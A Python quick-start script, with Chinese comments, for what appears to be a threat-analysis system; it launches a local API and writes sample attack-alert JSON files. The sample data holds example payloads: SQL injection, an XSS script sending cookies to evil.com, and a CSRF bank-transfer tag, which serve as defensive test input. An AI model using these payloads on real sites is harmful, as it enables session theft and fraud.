#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
快速启动脚本 - 一键启动系统并分析数据
"""

import os
import sys
import subprocess
import time
import requests
from datetime import datetime

def check_api_status():
    """检查API是否运行"""
    try:
        response = requests.get("http://localhost:8000/api/v1/system/status", timeout=5)
        return response.status_code == 200
    except:
        return False

def start_api_server():
    """启动API服务器"""
    print("\n🚀 启动API服务器...")
    try:
        # 使用uvicorn启动
        cmd = [sys.executable, "-m", "uvicorn", "src.api.server:app", "--host", "0.0.0.0", "--port", "8000"]
        process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)

        # 等待启动
        for i in range(30):
            if check_api_status():
                print("✅ API服务器启动成功！")
                return process
            time.sleep(1)
            print(f"   等待API启动... ({i+1}/30)")

        print("⚠️ API启动超时，但继续执行...")
        return process
    except Exception as e:
        print(f"❌ 启动API失败: {e}")
        return None

def create_sample_data():
    """创建示例数据目录和文件"""
    print("\n📁 创建示例数据...")

    data_dir = "data"
    os.makedirs(data_dir, exist_ok=True)

    # 创建不同类型的示例数据
    sample_files = {
        "web_attacks.json": [
            {
                "attack_type": "SQL Injection",
                "payload": "SELECT * FROM users WHERE id='1' OR '1'='1",
                "source_ip": "192.168.1.100",
                "target_ip": "10.0.0.5",
                "timestamp": datetime.now().isoformat(),
                "attack_stage": "execution",
                "threat_level": "high",
                "protocol": "HTTP"
            },
            {
                "attack_type": "XSS",
                "payload": "<script>document.location='http://evil.com/steal?cookie='+document.cookie</script>",
                "source_ip": "192.168.1.101",
                "target_ip": "10.0.0.6",
                "timestamp": datetime.now().isoformat(),
                "attack_stage": "injection",
                "threat_level": "medium",
                "protocol": "HTTP"
            },
            {
                "attack_type": "CSRF",
                "payload": "<img src='http://bank.com/transfer?to=attacker&amount=1000'>",
                "source_ip": "192.168.1.102",
                "target_ip": "10.0.0.7",
                "timestamp": datetime.now().isoformat(),
                "attack_stage": "exploitation",
                "threat_level": "low",
                "protocol": "HTTP"
            }
        ],
        "network_attacks.json": [
            {
                "attack_type": "DDoS",
                "payload": "SYN flood attack",
                "source_ip": "10.0.0.100",
                "target_ip": "192.168.1.1",
                "timestamp": datetime.now().isoformat(),
                "attack_stage": "reconnaissance",
                "threat_level": "critical",
                "protocol": "TCP"
            },
            {
                "attack_type": "Port Scan",
                "payload": "Nmap scan",
                "source_ip": "172.16.0.50",
                "target_ip": "192.168.1.0/24",
                "timestamp": datetime.now().isoformat(),
                "attack_stage": "reconnaissance",
                "threat_level": "medium",
                "protocol": "TCP"
            }
        ],
        "malware_attacks.json": [
            {
                "attack_type": "Ransomware",
                "payload": "Encrypting files...",
                "source_ip": "192.168.1.200",
                "target_ip": "192.168.1.50",
                "timestamp": datetime.now().isoformat(),
                "attack_stage": "post-exploitation",
                "threat_level": "critical",
                "protocol": "SMB"
            },
            {
                "attack_type": "Botnet",
                "payload": "C2 communication",
                "source_ip": "192.168.1.201",
                "target_ip": "10.0.0.10",
                "timestamp": datetime.now().isoformat(),
                "attack_stage": "command_and_control",
                "threat_level": "high",
                "protocol": "HTTP"
            }
        ]
    }

    created_files = []
    for filename, data in sample_files.items():
        filepath = os.path.join(data_dir, filename)
        import json
        with open(filepath, 'w', encoding='utf-8') as f:
            json.dump(data, f, ensure_ascii=False, indent=2)
        created_files.append(filepath)
        print(f"   ✓ 创建: {filepath}")

    return created_files

def run_data_analysis():
    """运行数据分析"""
    print("\n📊 运行数据分析...")
    try:
        result = subprocess.run([sys.executable, "data_processor.py"],
                              capture_output=True, text=True, encoding='utf-8')

        if result.returncode == 0:
            print("✅ 数据分析完成！")
            if result.stdout:
                print("\n分析结果摘要:")
                print("-" * 50)
                # 打印最后几行输出
                lines = result.stdout.strip().split('\n')
                for line in lines[-20:]:
                    if line.strip():
                        print(line)
        else:
            print("❌ 数据分析失败")
            if result.stderr:
                print("错误信息:", result.stderr)
    except Exception as e:
        print(f"❌ 运行分析失败: {e}")

def run_visualization():
    """运行数据可视化"""
    print("\n📈 生成可视化图表...")
    try:
        # 安装可视化依赖
        print("   检查可视化依赖...")
        import matplotlib
        import seaborn
        print("   ✓ 依赖检查通过")

        result = subprocess.run([sys.executable, "visualize_data.py"],
                              capture_output=True, text=True, encoding='utf-8')

        if result.returncode == 0:
            print("✅ 可视化完成！")
            print("   图表已保存到 'visualizations' 目录")
        else:
            print("⚠️ 可视化可能未完全完成")
            if result.stderr and "Matplotlib" in result.stderr:
                print("   提示: 请确保已安装 matplotlib 和 seaborn")
    except ImportError as e:
        print(f"⚠️ 可视化依赖缺失: {e}")
        print("   请运行: pip install matplotlib seaborn")
    except Exception as e:
        print(f"❌ 运行可视化失败: {e}")

def show_usage_info():
    """显示使用说明"""
    print("\n" + "="*80)
    print("📚 使用说明")
    print("="*80)
    print("""
1. API服务已在 http://localhost:8000 运行
2. 查看API文档: http://localhost:8000/docs

3. 分析自己的数据:
   - 将数据文件放入 data/ 目录
   - 支持格式: JSON, CSV, TXT, LOG
   - 运行: python data_processor.py

4. 生成可视化:
   - 运行: python visualize_data.py
   - 图表保存在 visualizations/ 目录

5. 直接调用API:
   curl -X POST http://localhost:8000/api/v1/analyze/alert \\
     -H "Content-Type: application/json" \\
     -d '{"alert_data": {"attack_type": "SQL Injection", "payload": "' OR '1'='1"}}'
""")

def main():
    """主函数"""
    print("="*80)
    print("🎯 网络威胁智能分析系统 - 快速启动")
    print("="*80)
    print(f"启动时间: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")

    # 1. 检查API状态
    print("\n🔍 检查系统状态...")
    if check_api_status():
        print("✅ API服务已在运行")
        api_process = None
    else:
        print("❌ API服务未运行，正在启动...")
        api_process = start_api_server()

    # 2. 创建示例数据
    sample_files = create_sample_data()

    # 3. 运行数据分析
    run_data_analysis()

    # 4. 运行可视化
    run_visualization()

    # 5. 显示使用说明
    show_usage_info()

    # 6. 保持运行
    print("\n💡 提示:")
    print("- 按 Ctrl+C 停止服务")
    print("- 日志文件: logs/api_server.log")
    print("- 数据文件: data/")
    print("- 分析结果: threat_analysis_results_*.json")
    print("- 可视化图表: visualizations/")

    print("\n系统已就绪，可以开始分析了！")

    # 保持进程运行
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("\n\n👋 正在关闭系统...")
        if api_process:
            api_process.terminate()
        print("系统已关闭")

if __name__ == "__main__":
    # 设置编码
    if sys.platform == 'win32':
        sys.stdout.reconfigure(encoding='utf-8')

    main()